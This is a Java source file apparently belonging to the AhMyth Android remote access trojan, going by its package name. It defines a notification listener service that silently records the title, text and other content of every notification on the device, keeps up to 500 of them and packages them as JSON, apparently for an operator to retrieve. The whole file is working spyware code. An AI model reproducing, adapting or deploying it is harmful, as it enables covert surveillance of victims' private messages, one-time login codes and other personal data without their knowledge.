package ahmyth.mine.king.ahmyth;

import android.app.Notification;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * NotificationReader captures all device notifications
 * Must be enabled in Settings > Notification Access
 */
public class NotificationReader extends NotificationListenerService {
    private static final String TAG = "NotificationReader";
    private static final int MAX_NOTIFICATIONS = 500;
    
    private static NotificationReader instance;
    private static List<NotificationEntry> notificationHistory = new ArrayList<>();
    private static boolean isEnabled = false;
    
    public static NotificationReader getInstance() {
        return instance;
    }
    
    public static boolean isServiceEnabled() {
        return isEnabled && instance != null;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "NotificationReader created");
    }
    
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        isEnabled = true;
        Log.d(TAG, "NotificationReader connected");
        
        // Get existing notifications
        try {
            StatusBarNotification[] activeNotifications = getActiveNotifications();
            if (activeNotifications != null) {
                for (StatusBarNotification sbn : activeNotifications) {
                    processNotification(sbn, "EXISTING");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting active notifications", e);
        }
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        processNotification(sbn, "POSTED");
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        processNotification(sbn, "REMOVED");
    }
    
    private void processNotification(StatusBarNotification sbn, String action) {
        if (sbn == null) return;
        
        try {
            NotificationEntry entry = new NotificationEntry();
            entry.action = action;
            entry.packageName = sbn.getPackageName();
            entry.postTime = sbn.getPostTime();
            entry.id = sbn.getId();
            entry.timestamp = System.currentTimeMillis();
            
            // Get app name
            try {
                PackageManager pm = getPackageManager();
                entry.appName = pm.getApplicationLabel(
                    pm.getApplicationInfo(sbn.getPackageName(), 0)
                ).toString();
            } catch (Exception e) {
                entry.appName = sbn.getPackageName();
            }
            
            Notification notification = sbn.getNotification();
            if (notification != null) {
                // Get notification extras
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    Bundle extras = notification.extras;
                    if (extras != null) {
                        CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
                        CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
                        CharSequence bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
                        CharSequence subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
                        
                        entry.title = title != null ? title.toString() : "";
                        entry.text = text != null ? text.toString() : "";
                        entry.bigText = bigText != null ? bigText.toString() : "";
                        entry.subText = subText != null ? subText.toString() : "";
                    }
                }
                
                entry.tickerText = notification.tickerText != null ? 
                    notification.tickerText.toString() : "";
                entry.category = notification.category;
            }
            
            synchronized (notificationHistory) {
                notificationHistory.add(entry);
                
                // Limit history size
                while (notificationHistory.size() > MAX_NOTIFICATIONS) {
                    notificationHistory.remove(0);
                }
            }
            
            Log.d(TAG, "Notification [" + action + "] from " + entry.appName + ": " + entry.title);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        isEnabled = false;
        Log.d(TAG, "NotificationReader destroyed");
    }
    
    /**
     * Get all captured notifications as JSON
     */
    public static JSONObject getNotifications() {
        JSONObject result = new JSONObject();
        JSONArray notificationsArray = new JSONArray();
        
        try {
            synchronized (notificationHistory) {
                for (NotificationEntry entry : notificationHistory) {
                    notificationsArray.put(entry.toJSON());
                }
            }
            
            result.put("enabled", isEnabled);
            result.put("count", notificationsArray.length());
            result.put("notifications", notificationsArray);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notifications JSON", e);
        }
        
        return result;
    }
    
    /**
     * Get active notifications currently showing
     */
    public JSONObject getActiveNotificationsJSON() {
        JSONObject result = new JSONObject();
        JSONArray notificationsArray = new JSONArray();
        
        try {
            if (instance != null) {
                StatusBarNotification[] active = getActiveNotifications();
                if (active != null) {
                    for (StatusBarNotification sbn : active) {
                        JSONObject notif = new JSONObject();
                        notif.put("packageName", sbn.getPackageName());
                        notif.put("postTime", sbn.getPostTime());
                        notif.put("id", sbn.getId());
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                            Bundle extras = sbn.getNotification().extras;
                            if (extras != null) {
                                notif.put("title", extras.getCharSequence(Notification.EXTRA_TITLE));
                                notif.put("text", extras.getCharSequence(Notification.EXTRA_TEXT));
                            }
                        }
                        
                        notificationsArray.put(notif);
                    }
                }
            }
            
            result.put("count", notificationsArray.length());
            result.put("active", notificationsArray);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting active notifications", e);
        }
        
        return result;
    }
    
    /**
     * Clear notification history
     */
    public static void clearHistory() {
        synchronized (notificationHistory) {
            notificationHistory.clear();
        }
        Log.d(TAG, "Notification history cleared");
    }
    
    /**
     * Inner class for notification entries
     */
    private static class NotificationEntry {
        String action;
        String packageName;
        String appName;
        String title;
        String text;
        String bigText;
        String subText;
        String tickerText;
        String category;
        long postTime;
        long timestamp;
        int id;
        
        JSONObject toJSON() {
            JSONObject obj = new JSONObject();
            try {
                obj.put("action", action);
                obj.put("packageName", packageName);
                obj.put("appName", appName);
                obj.put("title", title);
                obj.put("text", text);
                obj.put("bigText", bigText);
                obj.put("subText", subText);
                obj.put("tickerText", tickerText);
                obj.put("category", category);
                obj.put("postTime", postTime);
                obj.put("timestamp", timestamp);
                obj.put("id", id);
            } catch (JSONException e) {
                Log.e(TAG, "Error converting entry to JSON", e);
            }
            return obj;
        }
    }
}

